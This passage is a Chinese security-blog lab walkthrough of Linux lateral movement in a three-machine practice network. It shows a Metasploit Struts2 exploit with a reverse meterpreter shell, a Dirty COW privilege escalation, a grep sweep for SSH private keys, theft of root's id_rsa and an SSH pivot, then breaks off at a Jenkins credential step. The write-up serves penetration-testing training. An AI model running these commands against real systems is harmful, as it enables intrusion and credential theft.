---
title: Linux横向移动手法-CSK靶机
url: https://www.secpulse.com/archives/193865.html
source: 安全脉搏
date: 2022-12-23
fetch_date: 2025-10-04T02:18:09.961569
---

# Linux横向移动手法-CSK靶机

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Linux横向移动手法-CSK靶机

[内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-12-22

20,291

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681873.png)

## 前言

在Linux中横向移动手法相对Windows来说较少，相对来说我们只有利用SSH、web上的漏洞等较少方式去获得权限 在SSH协议中，连接到主机可采用两种登录方式：密码登录方式、密钥登录方式 密码登录方式，相信大家都明白它的工作原理，这里就不再赘述。对此我们可以来尝试爆破密码的方式来尝试登录到远程系统权限 密钥登录方式的原理是：利用密钥生成器制作一对密钥，其中一只公钥，一只私钥。将公钥添加到服务器的某个账户上，然后在客户端利用私钥即可完成认证并登录。这样一来，没有私钥，任何人都无法通过SSH暴力破解用户的密码来远程登录系统。那这里我们可以通过获取该目标服务器的SSH私钥信息即可获得该服务器的远程登录权限 一般ssh密钥文件都存放在~/.ssh/目录下，也可以在文件中搜索已保存的SSH凭证

```
敏感文件
~/.ssh/config #配置 ssh 连接相关参数的配置文件
~/.ssh/known_hosts  # 该服务器所有登录过的服务器的信息
~/.bash_history # 我们通过历史命令可以看到该服务器中有没有使用ssh私钥去远程连接服务器
搜索含有SSH凭证文件
grep -ir "BEGIN RSA PRIVATE KEY" /*
grep -ir "BEGIN DSA PRIVATE KEY" /*
grep -ir "BEGIN OPENSSH PRIVATE KEY" /*
```

在这里，我用一个纯Linux的内网靶机环境来做演示，首先我们来看一下当前内网环境的拓扑图

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681874.png "null")

通过拓扑图我们可以看到在当前内网环境中，一共有3台机器，一台是web服务器，同时也连接着互联网，另外两台分别为数据库服务器与Jenkins服务器，他们的网络环境中是做了限制的，web服务器对外开放，可直接访问。jenkins服务器的web应用只允许当前内网环境的主机访问，数据库服务器不出网，用于实现站库分离设计模式。网络划分配置如下：点击编辑 ->虚拟网络编辑器-> 更改设置，之后选择需要设置NAT类型的界面，修改子网IP为172.16.250.0 ，并点击应用

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-16716818741.png "null")

## 场景演示

首先我们先对入口点IP地址做一个端口扫描

这里我们访问它的80端口，发现是该系统的CMS为OpenCms 10.5，通过漏洞库得知该系统存在 struts2 命令执行漏洞

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681876.png "null")

访问一下struts2-showcase路径，看是否成功

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681878.png "null")

由此确定使用struts2并且是struts2 showcase，msf上可以利用这个漏洞。直接在msf中 search struts2，这里直接选择第一个利用即可

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681880.png "null")

设置攻击IP地址与反弹shell方式

```
set rhost 172.16.250.10
set rport 80
set payload linux/x64/meterpreter/reverse_tcp
set lhot 172.160.250.128
set lport 4444
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681883.png "null")

可以看到shell被成功反弹过来

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681886.png "null")

可以看到当前shell被反弹过来，并且权限为tomcat权限，这里的权限对我们来说相对较低，于是选择提权。首先上传一个linux-exploit-suggester脚本用于定位当前系统适合怎样的方式进行提权。由于这时候我们得到的shell不是tty类型的，改为tty使得shell更加稳定，然后赋予当前文件一个执行权限，将其执行。

```
upload /root/Desktop/linux-exploit-suggester.sh /tmp/aa.sh
shell
python3 -c "import pty;pty.spawn('/bin/bash')"
chmod u+x /tmp/aa.sh
./tmp/aa.sh
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681887.png "null")

运行之后就可以看到适合当前系统的提权方式，这里我选择使用脏牛来进行提权（在实战中请谨慎使用脏牛提权，该提权方式容易造成业务宕机） 这里步骤和我们刚刚上传提权定位脚本基本一致，首先将exp上传到shell中，将exp进行编译，将shell改为tty，直接执行编译后的exp

```
upload /root/Desktop/dirtycow-mem.c /tmp/cow.c
shell
python3 -c "import pty;pty.spawn('/bin/bash')"
gcc -Wall -o /tmp/dirtycow /tmp/cow.c -ldl -lpthread
chmod u+x /tmp/dirtycow
./tmp/dirtycow
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681889.png "null")

这里我们在拿到root权限之后，为了保持稳定需要输入下面两条命令，不然web服务器会死机-.-

```
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
echo 1 > /proc/sys/kernel/panic && echo 1 > /proc/sys/kernel/panic_on_oops && echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi && echo 1 > /proc/sys/kernel/panic_on_io_nmi && echo 1 > /proc/sys/kernel/panic_on_warn
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681892.png "null")

经过长时间的信息收集后，发现配置文件/opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties中有一条数据库登录的信息，判断出当前数据库服务器为172.16.250.50

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681893.png "null")

发现该站为站库分离系统，这里查看root目录下的.ssh目录发现存在一个私钥文件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681894.png "null")

这里再去查看root用户的历史命令发现该用户使用该密钥连接了172.16.250.30，那这里我们可以将该服务器的私钥文件下载到我们的攻击机中，然后使用攻击机去连接数据库服务器，因为我们现在所在的是提权的root用户bash，在msf中是tomcat的权限，我们无法直接下载root目录下的ssh私钥，所以我们需要先将私钥复制到/tmp/目录下，然后将它基于777的权限，在使用msf将其下载到我们的攻击机中

```
cp ~/.ssh/id_rsa /tmp/id_rsa
chmod 777 /tmp/id_rsa
exit
download /tmp/id_rsa /root/is_rsa
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681895.png "null")

这里给拖出来的私钥一个0700的执行权限，然后使用ssh去连接172.16.250.30

```
chmod 0700 id_rsa
ssh -i id_rsa root@172.16.250.30
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681898.png "null")

这里成功拿到第二台主机权限，权限为root，hostname为jenkins，这里对它进行一个信息收集发现该系统开放一个8080端口

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681900.png "null")

这里搭建一个socks代理访问一下看看当前jenkins服务器中8080端口所开放的是一个什么站点

```
use auxiliary/server/socks5
set srvhost 172.16.250.128
run
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681901.png "null")

然后修改proxychains文件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681904.png "null")

使用proxychains启动firefox

```
proxychains firefox
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193865-1671681905.png "null")

这里我们访问Jenkins应用程序内的凭证管理器内部，看到db\_backup用户密码已存储，但不可见，我们需要弄清楚如何从...